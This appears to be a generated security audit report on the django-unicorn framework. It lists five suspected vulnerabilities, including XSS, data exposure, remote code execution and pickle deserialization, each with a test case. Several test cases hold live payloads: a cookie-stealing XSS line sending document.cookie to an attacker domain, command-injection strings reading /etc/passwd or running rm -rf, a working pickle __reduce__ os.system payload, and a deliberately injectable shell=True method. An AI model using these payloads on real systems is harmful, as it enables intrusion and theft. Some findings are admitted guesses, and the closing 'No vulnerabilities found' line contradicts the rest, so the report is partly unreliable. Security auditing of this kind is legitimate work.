## Vulnerability List:

- Vulnerability name: Cross-Site Scripting (XSS) via Unsafe `safe` Feature

* Description:
    1. An attacker can inject malicious JavaScript code into user-controlled data.
    2. A developer using django-unicorn marks a component's property or template variable as `safe` (using `Meta: safe = (...)` or the `|safe` template filter) to bypass default HTML encoding.
    3. If this `safe` data originates from user input and is not properly sanitized in the component's Python code, the malicious JavaScript code will be rendered directly into the HTML output.
    4. When the component is rendered or updated via AJAX, the injected JavaScript code executes in the victim's browser, potentially in various contexts such as attribute values or HTML content. This vulnerability can be triggered when developers use `safe` in `Meta` class, `|safe` template filter, or when dynamically constructing HTML attributes using user-controlled data marked as `safe`.

* Impact:
    - Critical
    - An attacker can execute arbitrary JavaScript code in the context of the victim's browser.
    - This can lead to severe consequences, including session hijacking, account takeover, theft of sensitive data (like cookies and local storage), website defacement, redirection to malicious websites, and malware injection. The impact extends to full compromise of the user's interaction with the application.

* Vulnerability rank: critical

* Currently implemented mitigations:
    - Default HTML encoding of component output is enabled to prevent XSS in most scenarios, acting as a general mitigation.
    - The framework requires CSRF tokens for AJAX requests, offering protection against CSRF-based attacks, though not directly mitigating XSS itself.
    - The `safe` Meta class option and `|safe` template filter are documented, requiring developers to explicitly opt-out of HTML encoding for specific attributes or template variables, thereby putting the responsibility on developers to ensure safety when bypassing encoding.
    - Documentation warns against putting sensitive data into public properties and recommends using `javascript_exclude` to limit data exposure to the client, indirectly suggesting caution with user-controlled data.
    - Changelog for v0.36.0 highlights the default HTML encoding as a security fix for CVE-2021-42053, acknowledging past XSS concerns and emphasizing the importance of encoding.

* Missing mitigations:
    - Automatic input sanitization is not enforced when developers use the `safe` feature (either through `Meta` or the `|safe` template filter). The framework fully relies on developers to manually sanitize input before marking attributes as safe, increasing the risk of developer error.
    - Documentation lacks sufficiently prominent and detailed guidance on *how* to effectively sanitize inputs when using the `safe` feature. Best practices, recommended sanitization libraries, and example code snippets for secure sanitization are missing, making it harder for developers to implement secure coding practices.
    - The framework does not offer built-in sanitization utilities or recommend specific sanitization libraries directly within its documentation or codebase to aid developers in securely using the `safe` feature.
    - There is no clear security warning within the documentation emphasizing the high risks associated with incorrect use of the `safe` option, particularly when handling user-provided data.

* Preconditions:
    - A Django Unicorn component must use the `safe` feature, either by marking an attribute as `safe` in the component's `Meta` class or using the `|safe` template filter in the template for rendering a component property.
    - User input must be able to influence the data that is rendered using the `safe` feature. This can occur directly through `unicorn:model` binding in templates, URL parameters, form inputs, or indirectly through component logic and methods processing user-provided data.
    - Developers must fail to sanitize the user-provided input in the component's Python code *before* assigning it to a property marked as `safe` or rendered with the `|safe` filter.

* Source code analysis:
    - The `views.py` within `django_unicorn.views` package is responsible for processing component requests and rendering updates.
    - Inside `django_unicorn\views\__init__.py`, specifically in the `rendered` function within `UnicornView`, the code handles the `safe` Meta option.
    - The code iterates through `safe_fields` defined in the component's `Meta` class.
    - For each field marked as `safe`, the code retrieves the attribute value from the component instance using `getattr(component, field_name)`.
    - If the value is a string (`isinstance(value, str)`), it's marked as safe for HTML rendering using `mark_safe(value)` from `django.utils.html`. This step explicitly bypasses Django's automatic HTML escaping for the designated attribute when rendered in the template.
    - **Vulnerable Code Snippet (Conceptual Location in `django_unicorn\views\__init__.py`):**
    ```python
    # In django_unicorn\views\__init__.py (conceptual location, actual line number may vary)
    for field_name in safe_fields:
        value = getattr(component, field_name)
        if isinstance(value, str):
            # mark_safe bypasses HTML escaping, creating XSS risk if 'value' is user-controlled and unsanitized.
            setattr(component, field_name, mark_safe(value)) # noqa: S308 - Explicitly marking as safe, but potential vulnerability
    ```
    - The `UnicornTemplateResponse.render` method in `django_unicorn\components\unicorn_template_response.py` is responsible for rendering the template and applies the `mark_safe` marked values during this process.
    - When Django renders the template and encounters `{{ property_name }}` where `property_name` is a `safe` field (or uses `|safe` filter), it outputs the value directly as HTML without escaping due to `mark_safe`.

    - **Code Visualization (Data Flow):**

    ```
    [User Input] --> Django Unicorn Component (Property marked 'safe') --> `mark_safe()` applied (if string) --> Template Rendering (no further sanitization) --> HTTP Response (Unsafe HTML) --> Browser (XSS execution)
    ```

* Security test case:
    1. Create a Django application with Django Unicorn installed.
    2. Define a Django Unicorn component (e.g., `xss_component.py`) with an attribute named `unsafe_content` and explicitly mark it as `safe` within the `Meta` class or utilize the `|safe` template filter in the component's template.
        ```python
        # xss_component.py (Meta class approach)
        from django_unicorn.components import UnicornView

        class XSSMetaView(UnicornView):
            unsafe_content = ""

            class Meta:
                safe = ("unsafe_content",)
        ```
        or
        ```python
        # xss_component.py (|safe filter approach - component code remains the same, template changes)
        from django_unicorn.components import UnicornView

        class XSSFilterView(UnicornView):
            unsafe_content = ""
        ```
    3. Create a template for the component (e.g., `xss.html`).
        - For Meta `safe` approach (e.g., `xss_meta.html`):
        ```html
        <!-- xss_meta.html -->
        <div>
            <input type="text" unicorn:model="unsafe_content">
            <div id="xss-output" unicorn:id="xss-output">{{ unsafe_content }}</div>
        </div>
        ```
        - For `|safe` filter approach (e.g., `xss_filter.html`):
        ```html
        <!-- xss_filter.html -->
        <div>
            <input type="text" unicorn:model="unsafe_content">
            <div id="xss-output" unicorn:id="xss-output">{{ unsafe_content|safe }}</div>
        </div>
        ```
    4. Create a Django view and template to include this Unicorn component on a page accessible to external users. Configure URL routing accordingly.
    5. Access the page in a web browser as an external attacker.
    6. In the input field, inject a standard XSS payload. Examples:
        - `<img src='x' onerror='alert("XSS Vulnerability - Safe Feature")'>`
        - `<script>alert("XSS Vulnerability - Safe Feature (script tag)");</script>`
        - `" onclick="alert('XSS via attribute')" data-attr="` (attribute injection leading to event handler)
    7. Observe if an alert box with "XSS Vulnerability - Safe Feature" (or similar) appears in the browser. This confirms successful JavaScript execution from the injected payload, validating the XSS vulnerability due to the `safe` feature.
    8. For a more impactful test, use a payload to attempt cookie theft or redirection (as shown in the initial example: `<img src='x' onerror="document.location='https://attacker-controlled-domain.com/steal?cookie='+document.cookie">`). Monitor network requests to verify if a request is sent to the attacker's domain, potentially containing session cookies, which would further demonstrate the critical impact.

---

- Vulnerability name: Default Django Model Serialization Exposes All Fields

* Description:
    By default, when a Django Model instance is used as a field in a Unicorn component and bound using `unicorn:model` or directly rendered in the template, the entire model instance, including all its fields, is serialized and exposed in the HTML source code as part of the component's data. This behavior can lead to unintentional information disclosure of sensitive or internal data that developers may not intend to be publicly accessible. An attacker viewing the page source can easily access this serialized data.

* Impact:
    - High - Information Disclosure.
    - An attacker can potentially access sensitive data, such as private user details (e.g., personal information, internal IDs, private flags), internal system information, or other confidential model attributes, by simply inspecting the HTML source of the webpage.
    - This information disclosure can lead to further attacks, privacy breaches, or compromise of internal business logic and data.

* Vulnerability rank: high

* Currently implemented mitigations:
    - The documentation (`django-models.md`) explicitly warns about this default serialization behavior and provides suggestions for mitigation:
        - Customizing model serialization within the component to expose only necessary fields.
        - Utilizing `Meta.exclude` or `Meta.javascript_exclude` in the Unicorn component to prevent specific fields from being serialized and exposed to the client-side JavaScript.
    - These documented mitigations rely on manual implementation by the developer and are not enforced or enabled by default in the framework.

* Missing mitigations:
    - Lack of a default mechanism to prevent full model serialization. The framework could benefit from a project-level or component-level configuration setting to control the default serialization behavior. Options could include:
        - Defaulting to serializing only a predefined safe subset of model fields (e.g., fields explicitly marked as public).
        - Requiring explicit opt-in for full model serialization, forcing developers to consciously decide to expose all fields.
    - More prominent warnings or best practices in the main documentation, beyond just the Django Models section, to highlight the security implications of default model serialization and guide developers towards secure data handling practices.

* Preconditions:
    - A Django Unicorn component uses a Django Model instance as a public class variable.
    - This model field is bound in the component's template using `unicorn:model` or directly accessed within the template for rendering (e.g., `{{ user_profile }}` or `{{ user_profile.sensitive_field }}`).
    - The developer does not implement any of the documented mitigations (custom serialization, `Meta.exclude`, `Meta.javascript_exclude`) to restrict field serialization.

* Source code analysis:
    - `django-unicorn\docs\source\django-models.md`: This documentation file explicitly explains the default serialization behavior, including the warning: "Using this functionality will serialize your entire model by default and expose all of the values in the HTML source code. Do not use this particular functionality if there are properties that need to be kept private."  It also clearly describes mitigation options using `Meta.exclude` and `Meta.javascript_exclude`.
    - `django-unicorn\docs\source\views.md`:  Mentions `javascript_exclude` as a method to prevent data from being exposed to JavaScript, further emphasizing that data *is* exposed by default if not explicitly excluded.
    - While the exact code responsible for serialization isn't provided in the snippets, the documentation strongly indicates that default behavior serializes the entire model. Code inspection of the serialization logic in `django-unicorn` would confirm this behavior.

* Security test case:
    1. Step 1: Create a Django application with django-unicorn installed.
    2. Step 2: Define a Django Model (e.g., `UserProfile`) with several fields, including at least one field that would be considered sensitive (e.g., `ssn`, `private_notes`, `internal_status`).
    ```python
    # models.py
    from django.db import models

    class UserProfile(models.Model):
        name = models.CharField(max_length=255)
        email = models.EmailField()
        ssn = models.CharField(max_length=9) # Sensitive field
        internal_notes = models.TextField() # Sensitive internal notes
    ```
    3. Step 3: Create a Unicorn component (e.g., `ProfileComponent`) that includes an instance of `UserProfile` as a public class variable.  Instantiate and populate a `UserProfile` instance for testing.
    ```python
    # components/profile_component.py
    from django_unicorn.components import UnicornView
    from .models import UserProfile

    class ProfileComponentView(UnicornView):
        user_profile = UserProfile.objects.create(name="Test User", email="test@example.com", ssn="000000000", internal_notes="Internal admin notes")

    ```
    4. Step 4: In the component's template, bind a field of the `UserProfile` to an input using `unicorn:model` (e.g., `<input type="text" unicorn:model="user_profile.name">`). Or simply render the entire `user_profile` object or the sensitive `ssn` field directly in the template using Django template syntax (e.g., `{{ user_profile }}` or `{{ user_profile.ssn }}`).
    ```html
    <!-- components/profile_component.html -->
    <div>
        <input type="text" unicorn:model="user_profile.name">
        <p>SSN (Sensitive Data): {{ user_profile.ssn }}</p>
        <p>Full User Profile (for inspection): {{ user_profile }}</p>
    </div>
    ```
    5. Step 5: Create a Django view and template to render the `ProfileComponent`.
    6. Step 6: As an external attacker, access the rendered page in a web browser.
    7. Step 7: Inspect the HTML source code of the page. Use browser's "View Page Source" functionality.
    8. Step 8: Verify that the entire serialized `UserProfile` object is present in the HTML, including the sensitive fields (e.g., `ssn`, `internal_notes`), within the JSON data embedded in a `<script id="unicorn:data-profile-component" type="application/json">` tag or similar structure for the `ProfileComponent`. The JSON should contain all model fields, including those intended to be private.

---

- Vulnerability name: Cross-Site Scripting (XSS) via Unsafe HTML attribute handling in Dynamic Attributes

* Description:
    1. An attacker can inject malicious HTML attributes into a component's template, particularly through dynamically set attributes controlled by `unicorn:dirty` or `unicorn:loading` and their modifiers (`attr` or `class`).
    2. When `django-unicorn` processes and renders the component, these dynamically injected attributes are not consistently and contextually sanitized against XSS.
    3. If user-controlled data (directly or indirectly) influences the values set for these dynamic attributes (e.g., classes, attributes like `data-`, `style`, or event handlers), an attacker can inject arbitrary JavaScript code within HTML attribute values, leading to attribute-based XSS.
    4. For example, an attacker might manipulate data to set `unicorn:dirty.class` or `unicorn:loading.attr` to include malicious Javascript payloads like `"><img src=x onerror=alert(document.domain)>` or ` onclick=alert('XSS')`. These payloads, when dynamically injected into attributes, can execute JavaScript in the user's browser.

* Impact:
    - High
    - Successful exploitation allows an attacker to execute arbitrary JavaScript code in the victim's browser.
    - This can lead to session hijacking, cookie theft, redirection to malicious sites, website defacement, and other malicious actions, similar to other XSS vulnerabilities.

* Vulnerability rank: High

* Currently implemented mitigations:
    - General HTML encoding of updated field values is implemented by default as a broad mitigation against XSS.
    - The `safe` Meta option is documented, providing developers a way to bypass default encoding, but this is intended for cases where developers are expected to ensure safety, not for dynamic attributes.

* Missing mitigations:
    - Contextual output encoding appears to be lacking specifically for dynamically injected HTML attributes via `unicorn:dirty`, `unicorn:loading` with `attr` or `class` modifiers. The general HTML encoding might not be sufficient to prevent attribute-based XSS in these dynamic contexts.
    - Specific input sanitization or validation mechanisms for data used to dynamically construct HTML attributes are not explicitly documented or enforced by the framework.
    - Clear guidance on how to securely use dynamic attributes (`unicorn:dirty`, `unicorn:loading`) and prevent attribute-based XSS is missing in the documentation.

* Preconditions:
    1. The application must utilize Django Unicorn's dynamic attribute modifiers: `unicorn:dirty`, `unicorn:loading` combined with `attr` or `class` modifiers in component templates.
    2. User-controlled data must, directly or indirectly, influence the values that are set for these dynamic attributes (e.g., component properties bound to user inputs or derived from user-provided data).

* Source code analysis:
    - `docs\source\dirty-states.md` & `docs\source\loading-states.md`: These document how `unicorn:dirty` and `unicorn:loading` attributes with `attr` and `class` modifiers work. They illustrate how classes and attributes are dynamically toggled based on component state changes.
    - `docs\source\views.md`: Explains the `safe` Meta option, indicating awareness of XSS risks in general output rendering but not specifically addressing dynamic attribute contexts.
    - `docs\source\changelog.md` version 0.36.0: Mentions the security fix for CVE-2021-42053 related to general XSS prevention through HTML encoding, but it does not detail specific contextual encoding for dynamic attributes.
    - Codebase Review (Requires deeper analysis of django-unicorn codebase - not fully provided): A thorough examination of the code responsible for rendering dynamic attributes is necessary to confirm whether contextual encoding is applied to attribute values when using `unicorn:dirty.class`, `unicorn:dirty.attr`, `unicorn:loading.class`, and `unicorn:loading.attr`. Based on documentation and general web security principles, a lack of specific contextual encoding for attributes is a plausible vulnerability point.

* Security test case:
    1. Create a Django Unicorn component that utilizes `unicorn:dirty.class` to dynamically add a CSS class based on the dirty state of a component property.
    ```python
    # components/dirty_class_component.py
    from django_unicorn.components import UnicornView

    class DirtyClassView(UnicornView):
        name = ""
    ```
    ```html
    {# templates/unicorn/dirty_class_component.html #}
    <div>
        <input type="text" unicorn:model="name" unicorn:dirty.class="dynamic-dirty-{{ name }}" id="dynamic-attr-input"/>
    </div>
    ```
    2. Create a Django view and template to include the `DirtyClassView` component in a test page.
    3. As an attacker, craft an input that sets the `name` property to a malicious string designed to inject JavaScript into the `class` attribute. Payload example: `"><img src=x onerror=alert(document.domain)>`. Or simpler payload to inject event handler: `" onclick="alert('XSS')"`.
    4. Access the application page and interact with the input field (e.g., type the malicious payload into the input field).
    5. Inspect the rendered HTML source code for the input element (`<input id="dynamic-attr-input" ...>`). Verify if the injected JavaScript payload is present within the `class` attribute, for example: `<input type="text" unicorn:model="name" unicorn:dirty.class="dynamic-dirty-&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;" id="dynamic-attr-input" class="dynamic-dirty-"><img src=x onerror=alert(document.domain)>">`. Encoding may vary, but the injected code should be part of the attribute value.
    6. Further, interact with the element (e.g., by clicking on it, if payload injected an `onclick` event). Observe if the JavaScript code executes (e.g., an alert box appears showing `document.domain` or "XSS").
    7. If JavaScript execution is successful, the attribute-based XSS vulnerability in dynamic attribute handling is confirmed.

---

- Vulnerability name: Potential Remote Code Execution (RCE) via insecure argument parsing in method calls

* Description:
    1. `django-unicorn` processes arguments for component methods called from the frontend using `ast.literal_eval` and custom parsing logic (`django_unicorn.call_method_parser`).
    2. While `ast.literal_eval` is generally safer than `eval`, vulnerabilities can emerge from flawed custom parsing logic surrounding it, or unsafe type coercion and handling of parsed arguments.
    3. If an attacker can manipulate method arguments sent from the frontend, they might bypass intended parsing and validation, potentially injecting malicious code or manipulating server-side operations in unintended ways.
    4. Specifically concerning is the dynamic parsing of keyword arguments (`kwargs`) and type coercion in functions like `_call_method_name` within `django_unicorn.views.action_parsers.call_method`, along with the `cast_value` logic in `django_unicorn\typer.py`. If type coercion dynamically instantiates classes or executes code based on user-provided strings without strict control and validation, RCE vulnerabilities could arise.

* Impact:
    - Critical
    - Successful exploitation can lead to arbitrary code execution on the server.
    - This grants the attacker complete control over the application and potentially the entire server infrastructure, allowing for data breaches, system compromise, and denial of service.

* Vulnerability rank: Critical

* Currently implemented mitigations:
    - The code utilizes `ast.literal_eval` for parsing, which is designed to safely evaluate literal Python expressions, offering some initial level of safety compared to `eval`.
    - Type hinting and type coercion are implemented to constrain the types of arguments accepted by component methods, intending to restrict the scope of allowed input.

* Missing mitigations:
    - Robust input validation and sanitization for method arguments are crucial missing mitigations. While type hinting is present, it may not be sufficient to prevent sophisticated injection attacks or unexpected behaviors arising from complex argument structures. The effectiveness of input validation needs thorough review.
    - Custom type coercion logic, particularly in `django_unicorn\typer.py` and related modules, requires stringent security scrutiny. The dynamic instantiation of classes and custom types based on potentially user-influenced input strings is a high-risk area if not implemented with extreme care and security considerations.
    - There's no explicit mention or implementation of security-focused argument validation or sanitization within the provided code or documentation snippets.

* Preconditions:
    1. The Django Unicorn application utilizes components with methods that accept arguments.
    2. The application is publicly accessible via the internet, enabling external attackers to send crafted requests to trigger component method calls with malicious arguments.

* Source code analysis:
    - `django_unicorn\call_method_parser.py`: This module handles parsing method names and their arguments from strings received from the frontend. It uses `ast.parse` for initial parsing and `ast.literal_eval` for evaluating argument values. Key functions include `parse_call_method_name`, `eval_value`, and `parse_kwarg`.
    - `django_unicorn\views\action_parsers\call_method.py`: The `_call_method_name` function within this module is responsible for dynamically invoking methods on component instances. It takes parsed method names, arguments, and keyword arguments and uses `cast_value` and `get_type_hints` for argument type coercion before method invocation.
    - `django_unicorn\typer.py`: The `cast_value` function and related type handling logic in this module are critical points of analysis. These functions perform type coercion, including attempts to instantiate classes and convert values to expected types based on type hints. This dynamic type coercion based on input strings is a potential RCE vulnerability vector.
    - **Vulnerable Code Points**: The interaction between AST-based parsing in `call_method_parser.py`, dynamic method invocation in `call_method.py`, and the type coercion mechanisms in `typer.py` represents a high-risk area. The `cast_value` function, particularly its handling of custom type conversion and instantiation, demands intensive review to ensure it cannot be exploited for RCE through carefully crafted input strings.

* Security test case:
    **Warning**: This test case is designed to demonstrate a *potential* Remote Code Execution vulnerability. **Execute this test ONLY in a SAFE, ISOLATED TESTING ENVIRONMENT** with no sensitive data and under controlled conditions. Misuse of this test or execution in a production environment can have severe security consequences.

    1. Create a Django Unicorn component with a method designed to be intentionally vulnerable for demonstration purposes. This method will execute a shell command based on a provided argument. **Again, this is for testing ONLY and is extremely unsafe for production.**
    ```python
    # components/rce_component.py
    from django_unicorn.components import UnicornView

    class RceTestView(UnicornView):
        output = ""

        def execute_command(self, command): # Vulnerable method - DO NOT USE IN PRODUCTION
            import subprocess
            try:
                # UNSAFE: Directly executing shell command from user-provided 'command' argument
                self.output = subprocess.check_output(command, shell=True, text=True)
            except Exception as e:
                self.output = str(e)
    ```
    ```html
    {# templates/unicorn/rce_component.html #}
    <div>
        <button unicorn:click="execute_command('id')">Execute 'id' command (Safe)</button> <br/>
        <button unicorn:click="execute_command('whoami')">Execute 'whoami' command (Safe)</button> <br/>
        <button unicorn:click="execute_command('unsafe command injection point - vulnerable')">Vulnerable Point - Try Injection</button>
        <div>Output: <pre>{{ output }}</pre></div>
    </div>
    ```
    2. Create a Django view and template to render the `RceTestView` component.
    3. As an attacker, craft a request to call the `execute_command` method with a malicious payload as the argument. The goal is to inject a command that will be executed on the server. Example payload to attempt command injection:  `'id && cat /etc/passwd'`. Or, more directly dangerous: `'rm -rf /tmp/test_dir/*'`.
    4. Send a POST request to the Unicorn endpoint for this component. The request should contain an action queue that calls `execute_command` with the malicious command as the argument. The exact request structure will depend on how Unicorn actions are serialized, but it will involve specifying the component ID, method name (`execute_command`), and arguments.
    5. Monitor the server's behavior and observe the response. If the injected command executes successfully on the server, you might see:
        - The output of the injected command (`cat /etc/passwd` in the example) reflected in the component's `output` property and rendered on the page (in a safe test environment only).
        - Server-side effects, such as files being created or deleted (e.g., if you used `touch /tmp/pwned` or `rm -rf` in your payload - **exercise extreme caution**).
        - Check server logs for any indication of command execution errors or unexpected activity.
    6. Successful execution of an injected command confirms the Remote Code Execution vulnerability due to insecure argument parsing.

---

- Vulnerability name: Insecure Deserialization via `pickle` leading to Remote Code Execution (RCE)

* Description:
    1. `django-unicorn` uses Python's `pickle` serialization library for caching component state within `django_unicorn\cacher.py` when the serialization feature is enabled.
    2. Deserializing data from untrusted sources using `pickle` is inherently insecure. `pickle` allows for arbitrary code execution during the deserialization process if a malicious pickled payload is crafted and processed.
    3. If an attacker can find a way to inject or manipulate the cached component data (e.g., by exploiting other vulnerabilities or if the cache itself is insecurely managed), they can insert a malicious pickled object into the cache.
    4. When `django-unicorn` subsequently retrieves and deserializes this data from the cache using `pickle.loads`, the malicious code embedded in the pickled object will be executed on the server.

* Impact:
    - Critical
    - Successful exploitation of this vulnerability results in Remote Code Execution (RCE).
    - An attacker can execute arbitrary code on the server under the context of the web application, potentially gaining full control of the server, accessing sensitive data, modifying application logic, or launching further attacks.

* Vulnerability rank: Critical

* Currently implemented mitigations:
    - The documentation mentions component state caching and serialization as features, but there are no explicit security mitigations in place within the framework to address the inherent risks of using `pickle` for deserialization of potentially untrusted data.
    - The code in `django_unicorn\cacher.py` directly uses `pickle.dumps` for serialization and `pickle.loads` for deserialization without any input validation or safety checks against malicious payloads.

* Missing mitigations:
    - **Replace `pickle` with a safer serialization format:** The most effective mitigation is to completely replace `pickle` with a secure serialization format that does not inherently allow for arbitrary code execution during deserialization. Suitable alternatives include:
        - JSON: Widely supported, secure, and efficient for data serialization. Libraries like Python's `json` module or faster alternatives like `orjson` (already used in other parts of django-unicorn) could be used.
        - Other secure serialization formats:  Consider formats like MessagePack or Protocol Buffers if performance or schema evolution are primary concerns, ensuring the chosen format does not introduce deserialization vulnerabilities.
    - **Completely disable `pickle`-based caching and serialization:** If replacing `pickle` is not immediately feasible, the serialization feature (`UNICORN['SERIAL']['ENABLED'] = True`) should be strongly deprecated and eventually removed. Developers should be strongly advised against enabling this feature due to the significant security risks.
    - **Cryptographic Signing (Partial Mitigation, Not Recommended as Primary Solution):** While not a complete solution to insecure deserialization, cryptographically signing the pickled data before caching and verifying the signature before deserialization could offer some integrity protection. However, this is complex to implement securely and doesn't eliminate the inherent risks of `pickle`. Replacing `pickle` is the fundamentally more secure approach.

* Preconditions:
    1. The Django Unicorn serialization feature must be enabled (`UNICORN['SERIAL']['ENABLED'] = True`) in the application's settings.
    2. A cache backend other than `DummyCache` must be configured and in use, as `DummyCache` does not actually persist data, negating the caching vulnerability.
    3. An attacker needs to find a way to inject malicious pickled data into the cache. The feasibility of this precondition depends on the overall application's security posture and potential vulnerabilities that could allow cache manipulation. Direct cache injection might not always be directly achievable from the frontend, but could be possible if other vulnerabilities are present or if the caching infrastructure itself has security weaknesses.

* Source code analysis:
    - `django_unicorn\cacher.py`: This file contains the caching and serialization logic for component state. The critical functions are `cache_full_tree` (for serialization and caching) and `restore_from_cache` (for retrieval and deserialization from the cache).
    - **Vulnerable Code Snippets (in `django_unicorn\cacher.py`):**
    ```python
    import pickle
    # ...
    def cache_full_tree(component: Component, cache): # Serialization & Caching
        # ...
        pickled = pickle.dumps(component) # Vulnerable serialization using pickle.dumps
        cache.set(cache_key, pickled, timeout=SERIALIZATION_TIMEOUT)
        # ...

    def restore_from_cache(component_id: str, cache): # Deserialization & Retrieval
        # ...
        pickled = cache.get(cache_key)
        if pickled:
            component = pickle.loads(pickled) # Vulnerable deserialization using pickle.loads - RCE risk
            # ...
            return component
        # ...
    ```
    - `django_unicorn\settings.py`: Defines the `SERIAL` settings, including `SERIAL['ENABLED']`, which controls whether the vulnerable serialization and caching mechanism is active.

* Security test case:
    **Highly Important Security Warning**:  This test case is designed to demonstrate a critical Remote Code Execution vulnerability through insecure deserialization. **Perform this test ONLY in a SECURE, ISOLATED TESTING ENVIRONMENT** completely disconnected from any production systems or sensitive data. Understand the risks before proceeding. Exploiting insecure deserialization can have immediate and severe consequences, including full server compromise.

    1. **Prepare a Malicious Pickled Payload:** Create a Python script to generate a malicious pickled payload that, when deserialized, will execute arbitrary code on the server. For example, to create a file in `/tmp`:
    ```python
    import pickle
    import base64
    import os

    class MaliciousPayload(object):
        def __reduce__(self):
            return (os.system, ('touch /tmp/unicorn_pwned.txt',)) # Payload: Create file /tmp/unicorn_pwned.txt

    serialized_payload_bytes = pickle.dumps(MaliciousPayload())
    serialized_payload_base64 = base64.b64encode(serialized_payload_bytes).decode()
    print(serialized_payload_base64)
    ```
    Copy the Base64 encoded payload output.
    2. **Inject Malicious Payload into Cache:**  This step is environment-dependent and might require simulating cache manipulation if direct external injection isn't straightforward. For testing, you might need to:
        - Directly interact with the cache backend (e.g., using `redis-cli` for Redis) if you are using a persistent cache like Redis or Memcached. Manually set a cache key that `django-unicorn` would use (inspect `django_unicorn\cacher.py` to determine the cache key format) and set its value to the Base64 encoded malicious pickle payload. You'll need to decode the Base64 payload before inserting it into the cache if your cache client requires bytes.
        - For simpler testing with a local cache (like `LocMemCache` - though unlikely to be default for serialization), you might simulate cache injection by directly modifying the cache object in a debugging session (less practical for automated testing).
    3. **Trigger Component Deserialization:**  Access or interact with the Django Unicorn application in a way that triggers the deserialization of component state from the cache. This usually involves:
        - Initial page load where a cached component is expected to be restored.
        - Refreshing a page that contains a cached component.
        - Interacting with a component in a way that might cause it to be restored from cache after a previous session (depending on how caching and session management are configured in the application and django-unicorn).
    4. **Observe Server for RCE:** After triggering deserialization, monitor the server to see if the injected code executes. In the example payload (`touch /tmp/unicorn_pwned.txt`), check if the file `/tmp/unicorn_pwned.txt` is created in the `/tmp` directory on the server.
    5. **Verification:** If the file `/tmp/unicorn_pwned.txt` (or whatever action your payload was designed to perform) is created on the server after triggering deserialization, it confirms the Insecure Deserialization vulnerability and successful Remote Code Execution.

No vulnerabilities found
